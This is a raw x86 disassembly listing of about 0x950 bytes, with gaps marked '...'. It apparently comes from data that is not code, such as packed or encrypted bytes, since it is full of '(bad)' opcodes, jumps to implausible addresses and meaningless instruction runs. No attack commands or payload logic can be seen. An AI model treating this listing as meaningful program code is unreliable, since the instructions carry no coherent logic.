  410300:	dec    ebp
  410301:	(bad)  
  410302:	(bad)  
  410304:	push   es
  410305:	icebp  
  410306:	bound  eax,QWORD PTR [eax+0x57]
  410309:	imul   ebx,edi,0xffffffe9
  41030c:	rcr    ch,cl
  41030e:	je     0x41031b
  410310:	xor    al,0x54
  410312:	stos   DWORD PTR es:[edi],eax
  410313:	je     0x41034f
  410315:	or     al,0x25
  410317:	js     0x4102c4
  410319:	jle    0x410372
  41031b:	ret    
  41031c:	sub    ebx,edi
  41031e:	adc    al,0x5c
  410320:	retf   
  410321:	push   ebx
  410322:	fbstp  TBYTE PTR [eax+eiz*4-0x74]
  410326:	xlat   BYTE PTR ds:[ebx]
  410327:	jae    0x410340
  410329:	fidiv  WORD PTR [esi+0x206ca9eb]
  41032f:	add    al,0x74
  410331:	xchg   edx,eax
  410332:	fild   WORD PTR [ebx]
  410334:	or     al,0xde
  410336:	adc    al,0xc
  410338:	in     al,0xbe
  41033a:	xchg   ebx,eax
  41033b:	je     0x410327
  41033d:	fst    st(4)
  41033f:	pop    ebx
  410340:	dec    ebx
  410341:	push   ebx
  410342:	fbstp  TBYTE PTR [eax+eiz*2-0x74]
  410346:	xchg   edi,eax
  410347:	sub    dl,bl
  410349:	fnsave [esi-0x15]
	...
  410360:	lea    edx,[edi+ebx*8-0x18983d7d]
  410367:	imul   edx,DWORD PTR [edi-0x4d8b9123],0x67
  41036e:	push   ebx
  41036f:	je     0x410391
  410371:	mov    WORD PTR [edi+0x3a],es
  410374:	dec    eax
  410375:	fld    QWORD PTR [esi+0x4a]
  410378:	int    0x98
  41037a:	(bad)  
  41037c:	push   es
  41037d:	icebp  
  41037e:	bound  edi,QWORD PTR [edi]
  410380:	addr16 inc esi
  410382:	or     BYTE PTR [esi-0x5ea0228b],bl
  410388:	add    BYTE PTR [ecx+0x0],ch
  41038b:	adc    esp,edx
  41038d:	push   edx
  41038e:	cmc    
  41038f:	push   ds
  410390:	push   ss
  410391:	pop    eax
  410392:	hlt    
  410393:	push   0xffffff9a
  410395:	es inc edx
  410397:	test   al,0x8f
  410399:	xchg   esp,eax
  41039a:	add    eax,0x894ca6d
  41039f:	jmp    0xa2f3a3b0
  4103a4:	dec    esi
  4103a5:	(bad)  
  4103a7:	fidivr WORD PTR [ebx-0x7016f7e3]
  4103ad:	adc    DWORD PTR [ebx+ebp*4],esi
  4103b0:	jmp    0x410405
  4103b2:	or     cl,ch
  4103b4:	mov    ds,WORD PTR [eax]
  4103b6:	mov    edx,0x89948fe8
  4103bb:	add    al,0xa
  4103bd:	dec    edx
  4103be:	inc    edi
  4103bf:	jmp    0x8fcd9153
	...
  4103d8:	mov    DWORD PTR [eax+ecx*1+0x4216bd6a],edx
  4103df:	sub    BYTE PTR [eax+0x19650594],cl
  4103e5:	xchg   esp,eax
  4103e6:	or     cl,ch
  4103e8:	or     ah,BYTE PTR [eax-0x232edd7e]
  4103ee:	cmc    
  4103ef:	test   BYTE PTR [ebx],0x9
  4103f2:	or     cl,ch
  4103f4:	(bad)  
  4103f5:	adc    DWORD PTR [edi+eiz*2],esi
  4103f8:	add    edx,DWORD PTR [eax+ecx*1-0x17]
  4103fc:	mov    ds,WORD PTR [eax]
  4103fe:	jbe    0x4103e8
  410400:	(bad)  
  410401:	xchg   esp,eax
  410402:	mov    DWORD PTR [esi+ebx*8],ebx
  410405:	dec    ecx
  410406:	inc    edi
  410407:	jmp    0xdbcd919b
  41040c:	nop
  41040d:	xchg   esp,eax
  41040e:	or     BYTE PTR [eax],al
  410410:	mov    ebp,0x75416e32
  410415:	mov    edx,0x1e60fef5
  41041a:	inc    ebx
  41041b:	inc    ecx
  41041c:	gs pop ecx
  41041e:	dec    esp
  41041f:	clc    
  410420:	out    0xe5,al
  410422:	std    
  410423:	add    BYTE PTR [edx+0x14],bh
  410426:	pop    esi
  410427:	add    DWORD PTR [ebp-0x68],esi
  41042a:	and    esi,esi
  41042c:	and    esp,DWORD PTR [edi+0x7c]
  41042f:	clc    
  410430:	mov    bh,BYTE PTR [ebp-0x4e]
  410433:	dec    ebx
  410434:	hlt    
  410435:	xchg   edi,eax
  410436:	xor    eax,0x57c5e2e
	...
  410450:	mov    WORD PTR [esi+0x5b250007],ds
  410456:	pop    ebx
  410457:	or     al,0x9e
  410459:	sbb    DWORD PTR [esi-0x75],ebp
  41045c:	mov    edi,0x414d80f4
  410461:	fcomi  st,st(6)
  410463:	pop    fs
  410465:	test   BYTE PTR [edi],al
  410467:	add    ch,dh
  410469:	cmp    BYTE PTR [ebx],al
  41046b:	add    ebp,esi
  41046d:	xchg   edi,eax
  41046e:	pusha  
  41046f:	mov    cl,0x4d
  410471:	shl    ebp,1
  410473:	(bad)  
  410474:	sar    BYTE PTR [edi],cl
  410476:	cmp    esi,DWORD PTR [ecx]
  410478:	cmc    
  410479:	xchg   edi,eax
  41047a:	add    eax,eax
  41047c:	jmp    0x8997:0xe500fa0c
  410483:	jg     0x410462
  410485:	xchg   edi,eax
  410486:	add    eax,0x8981f84
  41048b:	add    BYTE PTR [edx],bh
  41048d:	fimul  WORD PTR ds:0xf6cd0ae8
  410493:	(bad)  
  410494:	cmp    al,0xcc
  410496:	in     eax,0xff
  410498:	ret    0xf6df
  41049b:	jne    0x410429
  41049d:	cmp    eax,0x5588767a
  4104a2:	add    BYTE PTR [esi-0x6d],al
  4104a5:	push   edx
  4104a6:	sar    DWORD PTR [edx-0xf5d30c],1
  4104ac:	stc    
  4104ad:	popf   
  4104ae:	push   ecx
  4104af:	std    
  4104b0:	mov    esp,0xb09ed
	...
  4104c5:	add    BYTE PTR [eax],al
  4104c7:	add    BYTE PTR [edx+eiz*8-0x80],cl
  4104cb:	mov    bl,0x8c
  4104cd:	in     eax,dx
  4104ce:	or     DWORD PTR [edx-0x74],ebp
  4104d1:	jo     0x410493
  4104d3:	out    0xbc,eax
  4104d5:	cmp    al,al
  4104d7:	jmp    0x410495
  4104d9:	pop    es
  4104da:	or     ch,BYTE PTR [edx-0x74]
  4104dd:	add    edi,DWORD PTR [ebx+0x14]
  4104e0:	dec    esi
  4104e1:	ss int 0xff
  4104e4:	xchg   BYTE PTR [ebp-0x12e47bf6],ch
  4104ea:	or     DWORD PTR [eax],eax
  4104ec:	sbb    DWORD PTR [eax+0x38234f60],esi
  4104f2:	push   esp
  4104f3:	(bad)  
  4104f4:	mov    eax,ds:0xe147819
  4104f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104fa:	leave  
  4104fb:	call   DWORD PTR [esi+0x1177f12d]
  410501:	test   al,0x6c
  410503:	dec    edi
  410504:	in     ax,dx
  410506:	sar    edi,cl
  410508:	gs jmp 0xfe60:0x7feaffd3
  410510:	jns    0x41057d
  410512:	mov    bl,0x40
  410514:	mov    esi,?
  410516:	dec    ecx
  410517:	jae    0x410553
  410519:	adc    bh,dh
  41051b:	fbstp  TBYTE PTR [ecx+edx*4+0x73c3fecd]
  410522:	int    0xdb
  410524:	or     DWORD PTR [eax-0x6c4cb094],esi
  41052a:	aam    0x4f
	...
  410540:	xor    eax,0x3608d994
  410545:	xchg   esp,eax
  410546:	pop    esi
  410547:	imul   DWORD PTR [edi+0x4689fcda]
  41054d:	push   ebp
  41054e:	(bad)  
  410550:	dec    ebx
  410551:	popa   
  410552:	sbb    ah,bl
  410554:	sbb    edx,0x4e
  410557:	mov    dl,0x7a
  410559:	pusha  
  41055a:	out    0x5b,eax
  41055c:	pop    edx
  41055d:	push   esp
  41055e:	cs jno 0x4105cb
  410561:	arpl   di,si
  410563:	jo     0x41053e
  410565:	nop
  410566:	push   ds
  410567:	not    DWORD PTR [ebx+0x52c306ec]
  41056d:	fimul  DWORD PTR [esi]
  41056f:	imul   DWORD PTR [ebx-0x26]
  410572:	jl     0x4105c3
  410574:	inc    edx
  410575:	pusha  
  410576:	out    0x5b,eax
  410578:	cmp    al,0x54
  41057a:	out    0x70,al
  41057c:	xor    ah,BYTE PTR [eax-0x35]
  41057f:	pop    ebx
  410580:	lea    ecx,[edi-0x2a]
  410583:	jo     0x4105a7
  410585:	pusha  
  410586:	ret    
  410587:	jo     0x410509
  410589:	push   cs
  41058a:	sub    eax,ebx
  41058c:	adc    ebp,DWORD PTR [edi+ebx*8+0x70]
  410590:	sub    al,0xb6
  410593:	push   ss
  410594:	adc    cl,BYTE PTR [esi+0x20]
  410597:	add    al,0xfb
  410599:	pop    edi
  41059a:	scas   eax,DWORD PTR es:[edi]
  41059b:	pop    ebx
  41059c:	jmp    0xeb1b3f1
  4105a1:	shr    bh,cl
  4105a3:	jo     0x4105a5
	...
  4105b5:	add    BYTE PTR [eax],al
  4105b7:	add    BYTE PTR [eax-0x20],dl
  4105ba:	(bad)  
  4105bb:	out    dx,al
  4105bc:	fist   WORD PTR [esi+edx*8-0x7125147a]
  4105c3:	jo     0x410579
  4105c5:	pop    ds
  4105c6:	jbe    0x410638
  4105c8:	ret    0x86e
  4105cb:	jmp    0x6f31660c
  4105d0:	call   0x7bd9:0x8fa8421a
  4105d7:	pop    ebp
  4105d8:	sbb    al,0x60
  4105da:	add    BYTE PTR [ecx+0x66],al
  4105dd:	push   esi
  4105de:	cmc    
  4105df:	dec    esi
  4105e0:	mov    esp,0x932bbf37
  4105e5:	xchg   esp,eax
  4105e6:	pop    ebx
  4105e7:	jb     0x4105cc
  4105e9:	adc    al,0xcd
  4105eb:	adc    eax,0x5cf5daf4
  4105f0:	dec    edx
  4105f1:	fstp   QWORD PTR [eax+0x26]
  4105f4:	bound  ecx,QWORD PTR [ebp+0x51d7d4f5]
  4105fa:	inc    edi
  4105fb:	jmp    0xe979d3b7
  410600:	(bad)  
  410601:	(bad)  
  410602:	enter  0x12f6,0x2a
  410606:	or     cl,ch
  410608:	(bad)  
  410609:	ror    DWORD PTR [ebx-0xf],1
  41060c:	mov    ss,WORD PTR [eax+ecx*1-0x3af3b17]
  410613:	out    0x93,al
  410615:	xchg   esp,eax
  410616:	or     BYTE PTR [ebx-0x78],dl
  410619:	outs   dx,BYTE PTR ds:[esi]
  41061a:	or     BYTE PTR [ebx+0x0],al
	...
  41062d:	add    BYTE PTR [eax],al
  41062f:	add    BYTE PTR [eax+0x455c086e],dl
  410635:	in     eax,0x58
  410637:	je     0x41064e
  410639:	in     eax,0xfd
  41063b:	mov    esi,0x3cf54973
  410640:	push   0x50ad7bda
  410645:	idiv   DWORD PTR [eax]
  410647:	jmp    0x160993db
  41064c:	xchg   ebp,eax
  41064d:	jmp    0x4106c9
  41064f:	call   0x55a19ae3
  410654:	adc    BYTE PTR [eax+ecx*1+0x0],dl
  410658:	adc    bl,bl
  41065a:	add    eax,ebp
  41065c:	adc    dl,cl
  41065e:	idiv   bh
  410660:	xchg   ebp,eax
  410661:	pop    ebp
  410662:	lds    ecx,FWORD PTR [ebp-0x1a3d8]
  410668:	xor    al,al
  41066a:	push   edi
  41066b:	call   0x37d7d2
  410670:	sub    al,0xb
  410672:	shl    bh,cl
  410674:	inc    edx
  410675:	imul   ebp,ebp,0xf6673935
  41067b:	push   0x75
  41067d:	mov    esp,0x942468ee
  410682:	cmc    
  410683:	mov    ch,0x81
  410685:	pop    edi
  410686:	idiv   bh
  410688:	mov    dl,0x9d
  41068a:	ror    BYTE PTR [eax+0x34],1
  41068d:	xchg   esp,eax
  41068e:	loopne 0x4106c5
  410690:	sub    ah,BYTE PTR [edi-0xa]
  410693:	mov    DWORD PTR [eax],eax
	...
  4106a5:	add    BYTE PTR [eax],al
  4106a7:	add    al,ch
  4106a9:	pusha  
  4106aa:	(bad)  
  4106ab:	call   DWORD PTR [edx-0x6e980a46]
  4106b1:	mov    eax,0x1d420048
  4106b6:	shl    bh,cl
  4106b8:	and    ah,BYTE PTR [edi-0xa]
  4106bb:	xor    eax,0x491c4d
  4106c0:	cmp    eax,0x42ff4d7f
  4106c5:	pop    ecx
  4106c6:	mov    esp,gs
  4106c8:	cmp    ah,BYTE PTR [edi-0xa]
  4106cb:	push   0xfffffff5
  4106cd:	mov    ebx,0x90b468f8
  4106d2:	cmc    
  4106d3:	mov    ch,0x21
  4106d5:	pop    edi
  4106d6:	idiv   bh
  4106d8:	and    bl,BYTE PTR [ebp-0x6f4bb730]
  4106de:	loopne 0x4106d9
  4106e0:	stos   DWORD PTR es:[edi],eax
  4106e1:	test   BYTE PTR [bx+di+0x688c],0x51
  4106e7:	not    bl
  4106e9:	push   es
  4106ea:	sar    bh,1
  4106ec:	xor    edx,DWORD PTR [edi-0x2f]
  4106ef:	inc    eax
  4106f0:	mov    WORD PTR [esi-0x50],ss
  4106f3:	fcmovnb st,st(3)
  4106f5:	pop    esi
  4106f6:	data16 (bad) 
  4106f8:	jns    0x4106ff
  4106fa:	mov    dl,0x40
  4106fc:	mov    WORD PTR [ebp+0x42],es
  4106ff:	inc    ebp
  410700:	mov    ds:0xb0847436,eax
  410705:	ss data16 (bad) 
  410708:	es in  eax,dx
  41070a:	sar    edx,1
	...
  410720:	hlt    
  410721:	sub    al,0xa
  410723:	(bad)  
  410724:	cmp    DWORD PTR [ecx+0x7e],edi
  410727:	(bad)  
  410728:	jnp    0x4106c8
  41072a:	xor    al,bl
  41072c:	les    ebp,FWORD PTR [edx+ecx*1]
  41072f:	call   0xfea82e5d
  410734:	adc    eax,0x5bf66970
  410739:	jle    0x4106c5
  41073b:	mov    esp,0xfe667e60
  410740:	mov    WORD PTR [ecx-0x26],ds
  410743:	addr16 mov ebp,gs
  410746:	push   esi
  410747:	mov    ebp,0xe7f1583b
  41074c:	jbe    0x41077b
  41074e:	addr16 (bad) 
  410750:	sub    edi,eax
  410752:	jl     0x41074a
  410754:	and    esi,DWORD PTR [esi-0x2a7b8b9d]
  41075a:	jbe    0x41079b
  41075c:	adc    eax,esi
  41075e:	arpl   WORD PTR [eax+edi*8+0x3fe6415],si
  410765:	mov    al,ds:0xad0ce7f4
  41076a:	arpl   si,di
  41076c:	repz pop edi
  41076e:	push   esp
  41076f:	imul   bl
  410771:	xchg   ebx,eax
  410772:	scas   al,BYTE PTR es:[edi]
  410773:	ins    DWORD PTR es:[edi],dx
  410774:	pop    eax
  410775:	mov    WORD PTR [edi-0x6128640e],ss
  41077b:	ins    DWORD PTR es:[edi],dx
  41077c:	sbb    al,dh
  41077e:	sahf   
  41077f:	ins    DWORD PTR es:[edi],dx
  410780:	retf   0xf4d6
  410783:	sti    
	...
  410798:	stos   DWORD PTR es:[edi],eax
  410799:	outs   dx,DWORD PTR ds:[esi]
  41079a:	pop    ds
  41079b:	ins    DWORD PTR es:[edi],dx
  41079c:	mov    edx,0xba6434d6
  4107a1:	(bad)  
  4107a2:	ins    WORD PTR es:[edi],dx
  4107a4:	and    BYTE PTR [edi+edx*2+0x56d763d6],cl
  4107ab:	ins    DWORD PTR es:[edi],dx
  4107ac:	loopne 0x410765
  4107ae:	push   esi
  4107af:	ins    DWORD PTR es:[edi],dx
  4107b0:	xchg   edx,eax
  4107b1:	(bad)  
  4107b2:	fdiv   st(3),st
  4107b4:	jae    0x4107cb
  4107b6:	dec    esi
  4107b7:	ins    DWORD PTR es:[edi],dx
  4107b8:	adc    dh,0x7c
  4107bb:	push   eax
  4107bc:	adc    dh,0x3e
  4107bf:	pop    esp
  4107c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c1:	push   ecx
  4107c2:	es ins DWORD PTR es:[edi],dx
  4107c4:	push   0x20
  4107c6:	adc    BYTE PTR [ebp+0x62],dh
  4107c9:	(bad)  
  4107ca:	pop    ss
  4107cb:	or     eax,0x6d1ed5cf
  4107d0:	sbb    cl,ch
  4107d2:	push   ds
  4107d3:	ins    DWORD PTR es:[edi],dx
  4107d4:	dec    edx
  4107d5:	in     eax,dx
  4107d6:	rol    eax,cl
  4107d8:	inc    edx
  4107d9:	(bad)  
  4107da:	div    BYTE PTR [esi+0x6cfede33]
  4107e0:	sub    ecx,DWORD PTR [edx+eiz*4-0x6b29d594]
  4107e7:	addr16 sbb dl,dh
  4107ea:	(bad)  
  4107eb:	pop    ebx
  4107ec:	sbb    DWORD PTR [ebx-0x22],edx
  4107ef:	ins    BYTE PTR es:[edi],dx
  4107f0:	adc    ah,BYTE PTR [eax]
  4107f2:	shl    BYTE PTR [edx+ecx*1-0x2a],0xd7
  4107f7:	jo     0x410846
  4107f9:	aad    0xb6
  4107fb:	ins    BYTE PTR es:[edi],dx
	...
  410810:	push   eax
  410811:	fmul   QWORD PTR [eax]
  410813:	shr    bh,0xd7
  410816:	cmc    
  410817:	scas   al,BYTE PTR es:[edi]
  410818:	js     0x41087a
  41081a:	hlt    
  41081b:	xchg   ecx,eax
  41081c:	loopne 0x4107c4
  41081e:	or     cl,ch
  410820:	xchg   esi,eax
  410821:	rol    DWORD PTR [eax],cl
  410823:	jmp    0x6b2612e2
  410828:	push   ebx
  410829:	fldenv [edx-0x17]
  41082c:	in     eax,0x4c
  41082e:	cmc    
  41082f:	hlt    
  410830:	mov    bh,0xed
  410832:	or     ebp,DWORD PTR [ecx]
  410834:	and    esi,edx
  410836:	jg     0x41085c
  410838:	sbb    al,0x6d
  41083a:	rcl    cl,0xce
  41083d:	aad    0xf6
  41083f:	aam    0x97
  410841:	in     eax,dx
  410842:	add    BYTE PTR [edi+0x20],dl
  410845:	(bad)  
  410846:	cmc    
  410847:	aam    0xfb
  410849:	(bad)  
  41084a:	jnp    0x41083d
  41084c:	out    0xa5,eax
  41084e:	dec    eax
  41084f:	ds call 0x902ed321
  410855:	aas    
  410856:	cmp    DWORD PTR ds:0x26fcd10c,0x97e0895a
  410860:	jp     0x4107f6
  410862:	or     dl,ah
  410864:	iret   
  410865:	pusha  
  410866:	or     al,0x20
  410868:	int    0x89
  41086a:	or     BYTE PTR [esi],al
  41086c:	cmp    al,BYTE PTR [ebp-0x6b657820]
  410872:	or     dl,ah
	...
  410888:	iret   
  410889:	pusha  
  41088a:	or     al,0x20
  41088c:	int    0x89
  41088e:	or     BYTE PTR [eax+0x4d],dh
  410891:	(bad)  
  410893:	push   esp
  410894:	test   al,0xed
  410896:	pushf  
  410897:	sub    esp,DWORD PTR [edi+0x74247fd6]
  41089d:	(bad)  
  41089e:	jnp    0x4108a0
  4108a0:	leave  
  4108a1:	push   0xe33af87c
  4108a6:	add    eax,0xf71a09e8
  4108ab:	(bad)  
  4108ac:	out    dx,al
  4108ad:	push   eax
  4108ae:	jns    0x4108eb
  4108b0:	pop    esp
  4108b1:	sar    ecx,cl
  4108b3:	push   0xffffffe5
  4108b5:	pop    ebx
  4108b6:	dec    esp
  4108b7:	hlt    
  4108b8:	xchg   ebp,eax
  4108b9:	imul   edi,DWORD PTR [esp+edi*8+0xd],0xaff6244
  4108c1:	aad    0xb5
  4108c3:	je     0x410898
  4108c5:	mov    eax,0x2a0a0ff5
  4108ca:	div    DWORD PTR [ebp-0x53]
  4108cd:	cmp    dh,bh
  4108cf:	sub    ch,BYTE PTR ds:[ecx-0xa]
  4108d3:	jne    0x41087e
  4108d5:	imul   edi,DWORD PTR [eax+ecx*1+0x4d],0xdaff371a
  4108dd:	aas    
  4108de:	jl     0x4108d4
  4108e0:	retf   0xf1c5
  4108e3:	inc    DWORD PTR [eax-0x30]
  4108e6:	in     eax,dx
  4108e7:	adc    al,0x7a
  4108e9:	aas    
  4108ea:	idiv   bh
	...
  410900:	and    BYTE PTR [ebp*8-0x9c0c8db],bh
  410907:	leave  
  410908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410909:	int3   
  41090a:	cmc    
  41090b:	push   esp
  41090c:	out    dx,al
  41090d:	ins    BYTE PTR es:[edi],dx
  41090e:	mov    al,ah
  410910:	and    esi,0x703975f6
  410916:	out    0x46,al
  410918:	cmp    bh,BYTE PTR [edi]
  41091a:	add    al,al
  41091c:	mov    al,0x94
  41091e:	push   esi
  41091f:	leave  
  410920:	ja     0x4108ee
  410922:	cmc    
  410923:	mov    WORD PTR [eax+0x48],?
  410926:	inc    ebp
  410927:	inc    eax
  410929:	int3   
  41092a:	in     eax,dx
  41092b:	mov    eax,ds:0xfe61828c
  410930:	xchg   edi,eax
  410931:	std    
  410932:	repnz sub esp,0xffffffbd
  410936:	or     DWORD PTR [eax],eax
  410938:	sti    
  410939:	mov    BYTE PTR [eax-0x19],ah
  41093c:	mov    BYTE PTR [edi+0x61],bh
  41093f:	(bad)  
  410940:	adc    eax,0x59fe5079
  410945:	stc    
  410946:	bound  esi,QWORD PTR [eax+ebp*8+0x32]
  41094a:	stc    
  41094b:	mul    esp
  41094d:	xlat   BYTE PTR ds:[ebx]
  41094e:	retf   
  41094f:	dec    bl
  410951:	ss clc 
  410953:	jmp    0x41090a
  410955:	pop    esi
  410956:	or     DWORD PTR [eax],eax
  410958:	mov    WORD PTR [ebp-0x42b296d3],fs
  41095e:	xlat   BYTE PTR ds:[ebx]
  41095f:	out    0x5b,eax
  410961:	adc    ecx,DWORD PTR [edx]
	...
  410977:	add    BYTE PTR [edi-0x5afb0783],dl
  41097d:	adc    eax,0x368c000a
  410982:	jns    0x4109eb
  410984:	scas   eax,DWORD PTR es:[edi]
  410985:	aam    0xcc
  410987:	jmp    FWORD PTR [ebx+0x47]
  41098a:	sbb    eax,0x79be8c00
  41098f:	mov    cl,bh
  410991:	push   ebp
  410992:	shl    DWORD PTR [edx],1
  410994:	cmc    
  410995:	cld    
  410996:	or     DWORD PTR [esi+0x74],edx
  410999:	out    0xf,eax
  41099b:	add    BYTE PTR [esi+eax*8-0x69718bb7],cl
  4109a2:	test   DWORD PTR [ecx-0x1d27ca64],0x67560015
  4109ac:	and    DWORD PTR [ecx*8+0x1c95d9ff],0xf6bd8c2e
  4109b7:	mov    edi,0x5ce19499
  4109bc:	mov    eax,0x58dcd01f
  4109c1:	cmp    eax,0x62f40420
  4109c6:	repz add ecx,DWORD PTR [edi+edx*4-0xf7f8451]
  4109ce:	push   edi
  4109cf:	xor    eax,0xd1df5565
  4109d4:	repz ret 0x3f4
  4109d8:	mov    WORD PTR [edi+0xef9f],ds
	...
  4109ee:	add    BYTE PTR [eax],al
  4109f0:	lea    edi,[edi+0x1c837dea]
  4109f6:	xor    eax,0xb7591451
  4109fb:	jge    0x410a45
  4109fd:	mov    eax,0x1f8c04a5
  410a02:	sub    eax,0xdf93c94c
  410a07:	push   0xef66f020
  410a0c:	stos   DWORD PTR es:[edi],eax
  410a0d:	rcl    ah,cl
  410a0f:	sti    
  410a10:	mov    bl,0x26
  410a12:	push   esi
  410a13:	imul   edx,DWORD PTR [edx+0x1664b51d],0x937c4b58
  410a1d:	push   ds
  410a1e:	xchg   ebp,eax
  410a1f:	push   eax
  410a20:	push   es
  410a21:	pop    eax
  410a22:	daa    
  410a23:	jl     0x4109a8
  410a25:	adc    al,0xfe
  410a27:	add    ebx,DWORD PTR [ebx+0x62689c17]
  410a2d:	shr    BYTE PTR [esi],cl
  410a2f:	out    dx,eax
  410a30:	addr16 mov ebp,0xd252c2bf
  410a36:	ins    BYTE PTR es:[edi],dx
  410a37:	mov    edi,0xb907653b
  410a3c:	retf   0xed1
  410a3f:	pop    ebp
  410a40:	cmp    esi,DWORD PTR [eax+0x38]
  410a43:	inc    esi
  410a44:	xchg   DWORD PTR [eax+ecx*1-0xa425764],edx
  410a4b:	je     0x410a68
  410a4d:	mov    edx,0xd2a52c53
  410a52:	add    DWORD PTR [ecx+0x0],ebp
	...
  410a68:	and    edi,DWORD PTR [ebp+0x60]
  410a6b:	out    dx,eax
  410a6c:	out    0x54,al
  410a6e:	or     BYTE PTR [ecx],bh
  410a70:	pusha  
  410a71:	mov    esp,0x6164c64c
  410a76:	pusha  
  410a77:	ds pop esi
  410a79:	xchg   ecx,eax
  410a7a:	or     BYTE PTR [ecx-0x70],al
  410a7d:	xchg   esp,eax
  410a7e:	in     eax,0x6f
  410a80:	(bad)  
  410a81:	stos   BYTE PTR es:[edi],al
  410a82:	pop    edi
  410a83:	sub    BYTE PTR [eax-0x2feb0a9c],dl
  410a89:	mov    ecx,0xd235012c
  410a8e:	loopne 0x410a41
  410a90:	iret   
  410a91:	shl    ch,cl
  410a93:	mov    al,0x51
  410a95:	cdq    
  410a96:	or     BYTE PTR [ecx+esi*1],dl
  410a99:	mov    ebp,0x3b33ad89
  410a9e:	or     BYTE PTR [ebx],al
  410aa0:	loop   0x410a74
  410aa2:	jnp    0x410a95
  410aa4:	aaa    
  410aa5:	retf   
  410aa6:	xor    ebx,DWORD PTR [esi+0x24]
  410aa9:	sbb    al,0x4c
  410aab:	push   ebp
  410aac:	imul   ebp,DWORD PTR [ebx-0x46782b0b],0xd2e446ab
  410ab6:	bound  ecx,QWORD PTR [edx]
  410ab8:	in     eax,0x48
  410aba:	add    BYTE PTR [ecx+0x18],al
  410abd:	shl    ch,cl
  410abf:	cs inc ecx
  410ac1:	lods   eax,DWORD PTR ds:[esi]
  410ac2:	cmc    
  410ac3:	pushf  
  410ac4:	push   edi
  410ac5:	mov    ecx,0xd2e41e97
  410aca:	pusha  
  410acb:	jmp    0x410ad0
	...
  410ae0:	pop    ecx
  410ae2:	mov    dh,0x81
  410ae4:	sahf   
  410ae5:	cmp    eax,DWORD PTR [edi+0x0]
  410ae8:	and    eax,0xe4690bed
  410aed:	xchg   esp,eax
  410aee:	cmc    
  410aef:	jne    0x410b1e
  410af1:	ins    DWORD PTR es:[edi],dx
  410af2:	into   
  410af3:	imul   esi,DWORD PTR [edx],0x3175f639
  410af9:	cmp    DWORD PTR [eax+ecx*1+0x3d],edi
  410afd:	cmp    esi,DWORD PTR [edi+edi*8]
  410b00:	loop   0x410a90
  410b02:	mov    DWORD PTR [esi*8+0x64ec82e3],0x32f7dd54
  410b0d:	cmp    DWORD PTR [ebp+eax*2+0x75f6e821],eax
  410b14:	sar    DWORD PTR [ecx],0x7c
  410b17:	or     ch,bh
  410b19:	and    ah,BYTE PTR [edx]
  410b1b:	add    ch,ah
  410b1d:	int    0xb5
  410b1f:	(bad)  
  410b22:	or     BYTE PTR [eax],al
  410b24:	mov    ch,0x91
  410b26:	dec    esp
  410b27:	clc    
  410b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b29:	xchg   esp,eax
  410b2a:	or     BYTE PTR [eax],al
  410b2c:	jmp    0x894:0xbafff9d2
  410b33:	push   0xffffffb5
  410b35:	jmp    0x8cf5:0xeaa569f5
  410b3c:	call   0xf8ce5081
  410b41:	inc    esp
  410b42:	(bad)  
  410b43:	inc    DWORD PTR [eax]
	...
  410b55:	add    BYTE PTR [eax],al
  410b57:	add    dl,dl
  410b59:	call   0x380e8154
  410b5e:	jl     0x410b5c
  410b60:	fucomp st(7)
  410b62:	and    DWORD PTR [eax],eax
  410b64:	jne    0x410b31
  410b66:	mov    ch,0x74
  410b68:	push   0x65018a71
  410b6d:	xchg   esp,eax
  410b6e:	pusha  
  410b6f:	mov    ah,0x1d
  410b71:	fprem1 
  410b73:	dec    BYTE PTR [eax+esi*1-0x4fb1802]
  410b7a:	outs   dx,BYTE PTR ds:[esi]
  410b7b:	(bad)  
  410b7c:	fadd   QWORD PTR [edx+0x5c]
  410b7f:	mov    WORD PTR [ecx],cs
  410b81:	retf   0xfe66
  410b84:	sub    ebp,DWORD PTR [esi]
  410b86:	fsub   st,st(7)
  410b88:	hlt    
  410b89:	cli    
  410b8a:	outs   dx,BYTE PTR ds:[esi]
  410b8b:	inc    BYTE PTR ds:0x13f64141
  410b91:	out    dx,eax
  410b92:	push   ecx
  410b93:	std    
  410b94:	retf   
  410b95:	out    0x6e,al
  410b97:	imul   ecx,DWORD PTR [ebp+edx*2-0x42b29715],0x6d4b46e
  410ba2:	outs   dx,DWORD PTR ds:[esi]
  410ba3:	(bad)  
  410ba4:	jmp    0x410b36
  410ba6:	hlt    
  410ba7:	out    0x8d,eax
  410ba9:	jp     0x410c18
  410bab:	inc    BYTE PTR ds:0xd3f67941
  410bb1:	cs sar bh,1
  410bb4:	xor    edx,DWORD PTR [ebx+0x1e8c40d3]
  410bba:	mov    ecx,0xd7
	...
  410bcf:	add    bl,al
  410bd1:	push   ss
  410bd2:	outs   dx,DWORD PTR ds:[esi]
  410bd3:	(bad)  
  410bd4:	cmp    ebp,eax
  410bd6:	push   ecx
  410bd7:	in     eax,0x4e
  410bd9:	inc    esi
  410bda:	outs   dx,BYTE PTR ds:[esi]
  410bdb:	mov    BYTE PTR [ecx],cl
  410bdd:	push   edx
  410bde:	data16 (bad) 
  410be0:	fwait
  410be1:	jecxz  0x410bec
  410be3:	push   0xffcce41f
  410be8:	mov    dh,BYTE PTR [eax]
  410bea:	inc    edx
  410beb:	test   BYTE PTR [ebx-0x7b8b91a2],0x65
  410bf2:	xor    al,BYTE PTR [ecx+0x73]
  410bf5:	mov    ?,WORD PTR [esp+eax*4+0x74]
  410bf9:	mov    gs,WORD PTR [esi-0x2]
  410bfc:	adc    DWORD PTR [eax],edi
  410bfe:	dec    ebp
  410bff:	neg    BYTE PTR [ebx-0x6c]
  410c02:	cs shr ebx,cl
  410c05:	push   eax
  410c06:	cwde   
  410c07:	les    ecx,FWORD PTR [ebx-0x32]
  410c0a:	push   esp
  410c0b:	dec    ebx
  410c0c:	cmp    cl,bh
  410c0e:	push   es
  410c0f:	data16 rcr BYTE PTR [edi+edx*1-0x9303266],0x7b
  410c18:	adc    BYTE PTR [eax+0x3a2265f6],bh
  410c1e:	(bad)  
  410c20:	adc    bh,BYTE PTR ds:0x9130420
  410c26:	enter  0xa6d,0xcf
  410c2a:	fsubp  st(7),st
  410c2c:	mov    edi,DWORD PTR [edi+ebp*2+0x78cefac2]
  410c33:	jg     0x410c35
	...
  410c45:	add    BYTE PTR [eax],al
  410c47:	add    bl,dl
  410c49:	(bad)  
  410c4a:	mov    dh,0x65
  410c4c:	push   cs
